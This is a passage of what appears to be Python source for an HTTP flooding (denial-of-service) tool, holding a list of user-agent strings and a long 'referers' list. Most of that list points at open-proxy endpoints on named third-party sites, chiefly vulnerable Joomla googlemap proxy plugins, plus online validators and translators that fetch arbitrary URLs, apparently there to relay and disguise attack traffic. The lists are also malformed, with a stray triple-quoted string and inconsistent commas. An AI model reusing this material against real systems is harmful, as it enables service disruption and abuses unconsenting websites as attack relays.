	 "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
	 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
	 "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
	 "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
	 "Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
     'Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN']
referers = [
   'http://help.baidu.com/searchResult?keywords=',
    """http://help.baidu.com/searchResult?keywords=,
    https://kriserlanggacity.com/=,
    http://www.bing.com/search?q=,
https://duckduckgo.com/?q=,
http://www.ask.com/web?q=,
http://search.aol.com/aol/search?q=,
https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=,
https://drive.google.com/viewerng/viewer?url=,
http://validator.w3.org/feed/check.cgi?url=,
http://host-tracker.com/check_page/?furl=,
http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=,
http://jigsaw.w3.org/css-validator/validator?uri=,
https://add.my.yahoo.com/rss?url=,
http://www.google.com/?q=,
http://www.usatoday.com/search/results?q=,
http://engadget.search.aol.com/search?q=,
https://steamcommunity.com/market/search?q=,
http://filehippo.com/search?q=,
http://www.topsiteminecraft.com/site/pinterest.com/search?q=,
http://eu.battle.net/wow/en/search?q=,
https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=,
https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=,
https://drive.google.com/viewerng/viewer?url=,
http://www.google.com/translate?u=,
https://developers.google.com/speed/pagespeed/insights/?url=,
http://help.baidu.com/searchResult?keywords=,
http://www.bing.com/search?q=,
https://add.my.yahoo.com/rss?url=,
https://play.google.com/store/search?q=,
http://www.google.com/?q=,
http://regex.info/exif.cgi?url=,
http://anonymouse.org/cgi-bin/anon-www.cgi/,
http://www.google.com/translate?u=,
http://translate.google.com/translate?u=,
http://validator.w3.org/feed/check.cgi?url=,
http://www.w3.org/2001/03/webdata/xsv?style=xsl&docAddrs=,
http://validator.w3.org/check?uri=,
http://jigsaw.w3.org/css-validator/validator?uri=,
http://validator.w3.org/checklink?uri=,
http://www.w3.org/RDF/Validator/ARPServlet?URI=,
http://www.w3.org/2005/08/online_xslt/xslt?xslfile=http%3A%2F%2Fwww.w3.org%2F2002%2F08%2Fextract-semantic.xsl&xmlfile=,
http://www.w3.org/2005/08/online_xslt/xslt?xmlfile=http://www.w3.org&xslfile=,
http://validator.w3.org/mobile/check?docAddr=,
http://validator.w3.org/p3p/20020128/p3p.pl?uri=,
http://online.htmlvalidator.com/php/onlinevallite.php?url=,
http://feedvalidator.org/check.cgi?url=,
http://gmodules.com/ig/creator?url=,
http://www.google.com/ig/adde?moduleurl=,
http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=,
http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=,
http://host-tracker.com/check_page/?furl=,
http://panel.stopthehacker.com/services/validate-payflow?email=1@1.com&callback=a&target=,
http://www.onlinewebcheck.com/check.php?url=,
http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=,
http://www.translate.ru/url/translation.aspx?direction=er&sourceURL=,
http://about42.nl/www/showheaders.php;POST;about42.nl.txt,
http://browsershots.org;POST;browsershots.org.txt,
http://streamitwebseries.twww.tv/proxy.php?url=,
http://www.comicgeekspeak.com/proxy.php?url=,
http://67.20.105.143/bitess/plugins/content/plugin_googlemap2_proxy.php?url=,
http://bemaxjavea.com/javea-rentals-alquileres/plugins/content/plugin_googlemap2_proxy.php?url=,
http://centrobrico.net/plugins/content/plugin_googlemap2_proxy.php?url=,
http://conodeluz.org/magnanet/plugins/content/plugin_googlemap2_proxy.php?url=,
http://greenappledentaldt.com/home/templates/plugins/content/plugin_googlemap2_proxy.php?url=,
http://html.strost.ch/dgi/plugins/content/plugin_googlemap2_proxy.php?url=,
http://kobbeleia.net/joomla/plugins/content/plugin_googlemap2_proxy.php?url=,
http://krd-medway.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=,
http://minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=,
http://old.ucpb.org/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.abs-silos.de/en/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.admksg.ru/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.autoklyszewski.pl/autoklyszewski/mambots/content/plugin_googlemap2_proxy.php?url=
http://www.build.or.at/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.caiverbano.it/sito/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.cbcstittsville.com/home/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.ciutatdeivissa.org/portal/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.contrau.com.br/web/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.dierenhotelspaubeek.nl/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.gaston-schul.nl/DU/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.gaston-schul.nl/FR/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.gillinghamgurdwara.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.gilmeuble.ch/cms/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.hortonmccormick.com/cms/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.kanzlei-berendes.de/homepage/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.kita-spielhaus.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.lacasaencarilo.com.ar/sitio/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.losaromos-spa.com.ar/cms/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.losaromos-spa.com.ar/~losaromo/cms/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.nickclift.co.uk/web/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.palagini.it/palagini/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.parsifaldisco.com/joomla/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.podosys.com/csm/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.renault-windisch.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.riegler-dorner.at/joomla/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.seevilla-dr-sturm.at/cms/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.sounders.es/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.suelcasa.com/suelcasa/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.tcl.lu/Site/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.tijssen-staal.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.triatarim.com.tr/TriaEn/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.tus-haltern.de/site/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.vm-esslingen.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.zahnarzt-buhl.de/praxis/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.sultanpalace.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.bergenpol.com/cms//plugins/content/plugin_googlemap2_proxy.php?url=
http://www.arantzabelaikastola.com/webgunea//plugins/content/plugin_googlemap2_proxy.php?url=
http://www.fare-furore.com/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.dog-ryusen.com/plugins/system/plugin_googlemap2_proxy.php?url=
http://www.spvgg-roedersheim.de/web/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
http://www.dahlnet.no/v2/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
http://ping-admin.ru/index.sema;POST;ping-admin.ru.txt
http://web-sniffer.net/?url=
http://sova-tour.com.ua/plugins/system/plugin_googlemap2_proxy.php?url=
http://scu-oldesloe.de/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=
http://translate.yandex.ru/translate?srv=yasearch&lang=ru-uk&url=
http://translate.yandex.ua/translate?srv=yasearch&lang=ru-uk&url=
http://translate.yandex.net/tr-url/ru-uk.uk/
http://www.bongert.lu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=
http://laresmadrid.org/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=
http://doleorganic.com/plugins/content/plugin_googlemap2_proxy.php?url=
http://crawfordlivestock.com/plugins/system/plugin_googlemap2_proxy.php?url=
http://www.aculaval.com/joomla/plugins/system/plugin_googlemap2_proxy.php?url=
http://grandsultansaloon.com/plugins/system/plugin_googlemap2_proxy.php?url=
http://www.d1010449.cp.blacknight.com/cpr.ie/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.architettaresas.it/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
http://basketgbkoekelare.be/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.arbitresmultisports.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
http://mobilrecord.com/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.dbaa.co.za/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=
http://waggum-bevenrode.sg-bevenrode.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=
http://bwsnt1.pdsda.net/plugins/system/plugin_googlemap3_proxy.php?url=
http://www.astecdisseny.com/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.fillmorefairways.com/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.bus-reichert.eu/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
http://www.maxxxi.ru/plugins/system/plugin_googlemap2_proxy.php?url=
http://potholepeople.co.nz/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
http://www.hammondgolf.com/plugins/system/plugin_googlemap2_proxy.php?url=
http://www.footgoal33.com/plugins/content/plugin_googlemap2_proxy.php?url=
http://bbtoma.com/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.tajmahalrestaurant.co.za/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
http://www.yerbabuenacuisine.com/plugins/system/plugin_googlemap2_proxy.php?url=
http://www.rinner-alm.com/plugins/system/plugin_googlemap2_proxy.php?url=
http://stockbridgetownhall.co.uk/plugins/content/plugin_googlemap2_proxy.php?url=
http://mentzerrepairs.com/plugins/system/plugin_googlemap2_proxy.php?url=
http://www.tilmouthwell.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
http://www.homevisionsinc.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=
http://toddlers.nalanda.edu.in/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=
http://cultura-city.rv.ua/plugins/system/plugin_googlemap3_proxy.php?url=
http://secret.leylines.info/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=
http://bike-electric.co.uk/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=
http://www.centroaquaria.com/plugins/content/plugin_googlemap2_proxy.php?url=
http://agenzia-anna.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
http://www.gretnadrug.com/plugins/system/plugin_googlemap2_proxy.php?url=
http://www.crestwoodpediatric.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
http://www.oceans-wien.com/plugins/system/plugin_googlemap2_proxy.php?url=;BYPASS
http://lavori.joomlaskin.it/italyhotels/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=
http://santaclaradelmar.com/hoteles/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=
http://www.authentic-luxe-locations.com/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=
http://www.keenecinemas.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
http://www.hotelmonyoli.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
http://prosperitydrug.com/plugins/content/plugin_googlemap2_proxy.php?url=
http://policlinicamonteabraao.com/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.vetreriafasanese.com/plugins/system/plugin_googlemap2_proxy.php?url=
http://www.benawifi.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
http://www.valleyview.sa.edu.au/plugins/system/plugin_googlemap2_proxy.php?url=
http://www.racersedgekarting.com/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=?url=
http://www.villamagnoliarelais.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
http://worldwide-trips.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=
http://systemnet.com.ua/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=
http://www.netacad.lviv.ua/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=
http://www.veloclub.ru/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=
http://www.virtualsoft.pl/plugins/content/plugin_googlemap3_proxy.php?url=
http://gminazdzieszowice.pl/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=
http://fets3.freetranslation.com/?Language=English%2FSpanish&Sequence=core&Url=
http://www.fare-furore.com/com-line/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.rotisseriesalaberry.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
http://www.lbajoinery.com.au/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.seebybike.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
http://www.copiflash.com/plugins/content/plugin_googlemap2_proxy.php?url=
http://suttoncenterstore.com/plugins/system/plugin_googlemap2_proxy.php?url=
http://coastalcenter.net/plugins/system/plugin_googlemap2_proxy.php?url=
http://whitehousesurgery.org/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.vertexi.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
http://www.owl.cat/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
http://www.sizzlebistro.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
http://thebluepine.com/plugins/system/plugin_googlemap2_proxy.php?url=
http://donellis.ie/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
http://validator.w3.org/unicorn/check?ucn_task=conformance&ucn_uri=
http://validator.w3.org/nu/?doc=
http://check-host.net/check-http?host=
http://www.netvibes.com/subscribe.php?url=
http://www-test.cisel.ch/web/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.sistem5.net/ww/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
http://www.fmradiom.hu/palosvorosmart/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.iguassusoft.com/site/plugins/content/plugin_googlemap2_proxy.php?url=
http://lab.univ-batna.dz/lea/plugins/system/plugin_googlemap2_proxy.php?url=
http://www.computerpoint3.it/cp3/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
http://hotel-veles.com/plugins/content/plugin_googlemap2_proxy.php?url=
http://klaassienatuinstra.nl/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.google.com/ig/add?feedurl=
http://anonymouse.org/cgi-bin/anon-www.cgi/
http://www.google.com/translate?u=
http://translate.google.com/translate?u=
http://validator.w3.org/feed/check.cgi?url=
http://www.w3.org/2001/03/webdata/xsv?style=xsl&docAddrs=
http://validator.w3.org/check?uri=
http://jigsaw.w3.org/css-validator/validator?uri=
http://validator.w3.org/checklink?uri=
http://qa-dev.w3.org/unicorn/check?ucn_task=conformance&ucn_uri=
http://www.w3.org/RDF/Validator/ARPServlet?URI=
http://www.w3.org/2005/08/online_xslt/xslt?xslfile=http%3A%2F%2Fwww.w3.org%2F2002%2F08%2Fextract-semantic.xsl&xmlfile=
http://www.w3.org/2005/08/online_xslt/xslt?xmlfile=http://www.w3.org&xslfile=
http://www.w3.org/services/tidy?docAddr=
http://validator.w3.org/mobile/check?docAddr=
http://validator.w3.org/p3p/20020128/p3p.pl?uri=
http://validator.w3.org/p3p/20020128/policy.pl?uri=
http://online.htmlvalidator.com/php/onlinevallite.php?url=
http://feedvalidator.org/check.cgi?url=
http://gmodules.com/ig/creator?url=
http://www.google.com/ig/adde?moduleurl=
http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=
http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=
http://host-tracker.com/check_page/?furl=
http://panel.stopthehacker.com/services/validate-payflow?email=1@1.com&callback=a&target=
http://www.viewdns.info/ismysitedown/?domain=
http://www.onlinewebcheck.com/check.php?url=
http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=
http://www.translate.ru/url/translation.aspx?direction=er&sourceURL=
http://about42.nl/www/showheaders.php;POST;about42.nl.txt
http://browsershots.org;POST;browsershots.org.txt
http://streamitwebseries.twww.tv/proxy.php?url=
http://www.comicgeekspeak.com/proxy.php?url=
http://67.20.105.143/bitess/plugins/content/plugin_googlemap2_proxy.php?url=
http://bemaxjavea.com/javea-rentals-alquileres/plugins/content/plugin_googlemap2_proxy.php?url=
http://centrobrico.net/plugins/content/plugin_googlemap2_proxy.php?url=
http://conodeluz.org/magnanet/plugins/content/plugin_googlemap2_proxy.php?url=
http://greenappledentaldt.com/home/templates/plugins/content/plugin_googlemap2_proxy.php?url=
http://html.strost.ch/dgi/plugins/content/plugin_googlemap2_proxy.php?url=
http://ijzerhandeljanssen.nl/web/plugins/content/plugin_googlemap2_proxy.php?url=
http://kobbeleia.net/joomla/plugins/content/plugin_googlemap2_proxy.php?url=
http://krd-medway.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=
http://link2europe.com/joomla/plugins/content/plugin_googlemap2_proxy.php?url=
http://minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=
http://old.ucpb.org/plugins/content/plugin_googlemap2_proxy.php?url=
http://peelmc.ca/plugins/content/plugin_googlemap2_proxy.php?url=
http://s2p.lt/main/plugins/content/plugin_googlemap2_proxy.php?url=
http://smartonecity.com/pt/plugins/content/plugin_googlemap2_proxy.php?url=
http://snelderssport.nl/web/plugins/content/plugin_googlemap2_proxy.php?url=
http://sunnyhillsassistedliving.com/plugins/content/plugin_googlemap2_proxy.php?url=
http://thevintagechurch.com/www2/index.php?url=/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.abc-haus.ch/reinigung/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.abs-silos.de/en/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.admksg.ru/plugins/content/plugin_googlemap2_proxy.php?url=
http://www.alhambrahotel.net/site/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.aliento.ch/cms/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.autoklyszewski.pl/autoklyszewski/mambots/content/plugin_googlemap2_proxy.php?url=,
http://www.build.or.at/plugins/content/plugin_googlemap2_proxy.php?url=,,
http://www.caiverbano.it/sito/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.cbcstittsville.com/home/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.ciutatdeivissa.org/portal/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.contrau.com.br/web/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.dierenhotelspaubeek.nl/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.fotorima.com/rima/site2/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.gaston-schul.nl/DU/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.gaston-schul.nl/FR/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.gillinghamgurdwara.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.gilmeuble.ch/cms/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.hortonmccormick.com/cms/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.icel.be/cms/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.idea-designer.com/idea/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.jana-wagenknecht.de/wcms/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.kanzlei-berendes.de/homepage/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.kita-spielhaus.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.kjg-hemer.de/joomla/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.labonnevie-guesthouse-jersey.com/site/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.lacasaencarilo.com.ar/sitio/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.losaromos-spa.com.ar/cms/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.losaromos-spa.com.ar/~losaromo/cms/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.nickclift.co.uk/web/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.oliebollen.me/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.palagini.it/palagini/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.paro-nl.com/v2/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.parsifaldisco.com/joomla/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.podosys.com/csm/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.precak.sk/penzion/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.pyrenees-cerdagne.com/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.renault-windisch.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.rethinkingjournalism.com/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.riegler-dorner.at/joomla/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.sealyham.sk/joomla/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.seevilla-dr-sturm.at/cms/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.siroki.it/newsite/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.sounders.es/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.suelcasa.com/suelcasa/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.tcl.lu/Site/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.tijssen-staal.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.triatarim.com.tr/TriaEn/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.tus-haltern.de/site/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.uchlhr.com/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.virmcc.de/joomla/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.visitsliven.com/bg/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.vm-esslingen.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.yigilca.gov.tr/_tr/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.zahnarzt-buhl.de/praxis/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.sultanpalace.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.bergenpol.com/cms//plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.arantzabelaikastola.com/webgunea//plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.fare-furore.com/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.dog-ryusen.com/plugins/system/plugin_googlemap2_proxy.php?url=,
http://www.dunaexpert.hu/home/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.spvgg-roedersheim.de/web/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=,
http://www.stephanus-web.de/joomla1015/mambots/content/plugin_googlemap2_proxy.php?url=,
http://www.dahlnet.no/v2/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=,
http://ping-admin.ru/index.sema;POST;ping-admin.ru.txt,
http://web-sniffer.net/?url=,
http://www.map-mc.com/plugins/system/plugin_googlemap2_proxy.php?url=,
http://sova-tour.com.ua/plugins/system/plugin_googlemap2_proxy.php?url=,
http://diegoborba.com.br/andes/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=,
http://karismatic.com.my/new/plugins/content/plugin_googlemap2_proxy.php?url=,
http://scu-oldesloe.de/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=,
http://www.awf.co.nz/plugins/system/plugin_googlemap3_proxy.php?url=,
http://translate.yandex.ru/translate?srv=yasearch&lang=ru-uk&url=,
http://translate.yandex.ua/translate?srv=yasearch&lang=ru-uk&url=,
http://translate.yandex.net/tr-url/ru-uk.uk/,
http://www.oldbrogue.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=,
http://www.mcdp.eu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=,
http://www.phimedia.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=,
http://www.bongert.lu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=,
http://laresmadrid.org/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=,
http://www.epcelektrik.com/en/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=,
http://doleorganic.com/plugins/content/plugin_googlemap2_proxy.php?url=,
http://crawfordlivestock.com/plugins/system/plugin_googlemap2_proxy.php?url=,
http://www.aculaval.com/joomla/plugins/system/plugin_googlemap2_proxy.php?url=,
http://grandsultansaloon.com/plugins/system/plugin_googlemap2_proxy.php?url=,
http://www.d1010449.cp.blacknight.com/cpr.ie/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.architettaresas.it/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=,
http://basketgbkoekelare.be/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.arbitresmultisports.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=,
http://mobilrecord.com/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.oldbrogue.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=,
http://www.mcdp.eu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=,
http://www.dbaa.co.za/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=,
http://waggum-bevenrode.sg-bevenrode.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=,
http://bwsnt1.pdsda.net/plugins/system/plugin_googlemap3_proxy.php?url=,
http://www.astecdisseny.com/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.fillmorefairways.com/plugins/content/plugin_googlemap2_proxy.php?url=,
http://www.bus-reichert.eu/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=,
http://www.maxxxi.ru/plugins/system/plugin_googlemap2_proxy.php?url=,
http://potholepeople.co.nz/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=,
http://www.hammondgolf.com/plugins/system/plugin_googlemap2_proxy.php?url=,
